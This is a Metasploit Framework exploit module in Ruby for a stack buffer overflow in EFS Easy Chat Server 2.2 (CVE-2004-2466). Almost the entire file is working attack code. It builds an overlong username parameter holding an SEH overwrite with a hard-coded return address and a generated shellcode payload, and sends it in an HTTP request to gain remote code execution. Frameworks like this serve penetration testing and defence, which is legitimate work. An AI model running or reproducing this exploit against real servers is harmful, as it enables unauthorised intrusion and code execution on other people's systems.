##
# $Id: efs_easychatserver_username.rb 9966 2010-08-06 20:12:51Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /Easy Chat Server\/1\.0/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EFS Easy Chat Server Authentication Request Handling Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in EFS Software Easy Chat Server. By
				sending a overly long authentication request, an attacker may be able to execute
				arbitrary code.

				NOTE: The offset to SEH is influenced by the installation path of the program.
				The path, which defaults to "C:\Program Files\Easy Chat Server", is concatentated
				with "\users\" and the string passed as the username HTTP paramter.
			},
			'Author'         => [ 'LSO <lso[at]hushmail.com>' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9966 $',
			'References'     =>
				[
					[ 'CVE', '2004-2466' ],
					[ 'OSVDB', '7416' ],
					[ 'BID', '25328' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x0a\x0b\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Easy Chat Server 2.2', { 'Ret' => 0x1001b2b6 } ], # patrickw OK 20090302 w2k
				],
			'DisclosureDate' => 'Aug 14 2007',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('PATH', [ true, "Installation path of Easy Chat Server",
					"C:\\Program Files\\Easy Chat Server" ])
			], self.class )
	end

	def check
		info = http_fingerprint # check method
		# NOTE: Version 2.2 still reports "1.0" in the "Server" header
		if (info =~ /Easy Chat Server\/1\.0/)
			return Exploit::CheckCode::Appears
		end
		Exploit::CheckCode::Safe
	end

	def exploit
		# randomize some values.
		val = rand_text_alpha(rand(10) + 1)
		num = rand_text_numeric(1)

		path = datastore['PATH'] + "\\users\\"
		print_status("path: " + path)

		# exploit buffer.
		filler = rand_text_alpha(256 - path.length)
		seh    = generate_seh_payload(target.ret)
		juju = filler + seh

		uri = "/chat.ghp?username=#{juju}&password=#{val}&room=2&#sex=#{num}"

		print_status("Trying target #{target.name}...")

		send_request_raw({'uri' => uri}, 5)

		handler
		disconnect
	end

end
